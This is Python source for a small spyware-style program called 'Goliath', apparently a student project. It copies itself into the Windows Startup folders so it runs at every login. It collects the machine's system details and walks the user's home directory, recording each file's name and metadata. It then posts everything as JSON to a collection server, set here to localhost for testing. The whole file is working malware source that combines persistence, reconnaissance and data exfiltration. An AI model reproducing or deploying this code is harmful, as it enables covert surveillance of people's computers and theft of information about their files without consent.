import os
import shutil
import subprocess
import json
import requests
import platform
import fluffylog

# Create log instance
log = fluffylog.FluffyLog()
log.info('Goliath Online...')


# Necessary variables
win7_common_startup =\
    'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
win7_user_startup =\
    os.path.join(
        os.path.expanduser("~"),
        '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
server_url = 'http://127.0.0.1:9292/json'
#user_home = os.path.expanduser("~")
# For testing
user_home = os.path.expanduser('~/MyApps/school/introduction python')


# Functions
def copy_to_dir(dir_path):
    if os.path.exists(dir_path):
        shutil.copy(__file__, dir_path)
        log.debug('Copied itself to ({})'.format(dir_path))
    else:
        os.mkdir(dir_path)
        log.warning('Dir does not exist, creating ({})'.format(dir_path))
        shutil.copy(__file__, dir_path)
        log.debug('Copied itself to ({})'.format(dir_path))


def copy_to_startup():
    try:
        copy_to_dir(win7_common_startup)
    except Exception as e:
        raise e
        copy_to_dir(win7_user_startup)


def post_json_to_server(url, data):
    log.debug('Sending data to ({})'.format(url))
    try:
        s = requests.Session()
        req = requests.Request('POST', url, data=data)
        prepped = req.prepare()
        prepped.headers['Content-Type'] = 'application/json'
        response = s.send(prepped).status_code
        log.debug('Json sent, response ({})'.format(response))
    except Exception as e:
        raise e
        log.warning('Sending failed, setting response to -1')
        response = -1

    return response


def gather_pc_info():
    pc_info = platform.uname()
    pc_data = {'kind': 'PC info', 'data': {
        'Name': pc_info.node,
        'System': pc_info.system,
        'Version': pc_info.version,
        'Release': pc_info.release,
        'Machine': pc_info.machine,
        'Processor': pc_info.processor
    }}

    return pc_data


def gather_dir_info(dir_path):
    file_data = {'kind': 'User path data', 'data': []}
    if os.path.isdir(dir_path):
        log.info('Started dir info ({})'.format(dir_path))
        all_files = []
        c = os.walk(dir_path)
        for root, dirs, files in c:
            dir_files = []
            for f in files:
                stat = os.stat(os.path.join(root, f))
                dir_files.append({'name': f, 'stats': stat})
            all_files.append({'folder': root, 'files': dir_files})
        file_data.update({'data': all_files})
        log.info('Finished dir info ({})'.format(dir_path))
    else:
        log.warning('Path is not a directory ({})'.format(dir_path))
        log.debug('Returning empty list')

    return {'file_data': file_data}


# Main function
def main():
    try:
        copy_to_startup()
        pc_i = gather_pc_info()
        dir_i = gather_dir_info(user_home)
        all_data = {'pc_data': pc_i, 'file_data': dir_i}
        all_data_json = json.dumps(all_data)
        post_json_to_server(server_url, all_data_json)
    except Exception as e:
        log.error('Unknown exeption found:\n({0})'.format(e))
    finally:
        log.flush()


if __name__ == '__main__':
    main()
